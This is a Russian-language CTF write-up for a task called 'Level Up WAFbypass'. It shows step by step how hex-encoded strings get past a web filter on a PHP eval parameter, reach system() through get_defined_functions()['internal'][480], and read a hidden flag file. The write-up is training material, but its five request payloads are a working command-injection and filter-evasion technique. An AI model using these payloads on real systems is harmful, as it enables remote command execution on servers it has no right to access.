# Level Up WAFbypass - writeup

Дана страница, в ней параметр cmd. Нужно подбирать обход WAF, чтобы постепенно дойти к eval.

### Step 1

На первом этапе можно профаззить параметр алфавитом и спецсимволами и увидеть, что не фильтруются кавычки. Ставим кавычки и получаем первый успех.

```bash
GET /?cmd=""
```

![image.png](Level%20Up%20WAFbypass%20-%20writeup%20182021737a8980758db0c225c31d06be/image.png)

### Step 2

Снова прогоняем интрудер, видим что не фильтруются буквы a,b,c,d,e,f,x; цифры и спецсимволы. Наличие х в этом списке явно указывает на необходимость использования шестнадцатеричного представления. И вот тут самая сложная точка в задании - понять, что здесь нужно прибегнуть к массиву объявленных функций, т.к. фильтр ждет ровно такую строку. Используем кавычки и HEX-преобразование, чтобы обойти WAF.

```bash
GET /?cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()
```

![image.png](Level%20Up%20WAFbypass%20-%20writeup%20182021737a8980758db0c225c31d06be/image%201.png)

### Step 3

Просто развиваем идею, обращаемся ко вложенным функциям.

```bash
GET /?cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c"]
```

![image.png](Level%20Up%20WAFbypass%20-%20writeup%20182021737a8980758db0c225c31d06be/image%202.png)

### Step 4

Нас интересует вложенная функция system, которая позволяет выполнять код на уровне ОС. Но нам неизвестен ее индекс в массиве функций. Ничего не остается, кроме как прогнать интрудером элементы массива от 1 до 1000. Удача улыбается и функция находится на индексе 480.

```bash
GET /?cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c"][480]
```

![image.png](Level%20Up%20WAFbypass%20-%20writeup%20182021737a8980758db0c225c31d06be/image%203.png)

### Step 5

Имея доступ к шеллу, заканчиваем таск. После захексованного “ls -la” находим файл флага в спрятанной директории …/.flag

НЕ ЗАБЫВАЕМ ПОСТАВИТЬ ТОЧКУ С ЗАПЯТОЙ, ИНАЧЕ СЕРВЕР ВОЗВРАЩАЕТ ОШИБКУ СИНТАКСИСА 500!

```bash
GET /index.php?cmd="\x67\x65\x74\x5f\x64\x65\x66\x69\x6e\x65\x64\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"()["\x69\x6e\x74\x65\x72\x6e\x61\x6c"][480]("\x63\x61\x74\x20\x2e\x2e\x2e\x2f\x2e\x66\x6c\x61\x67");
```

Соединяем части флага. Успех!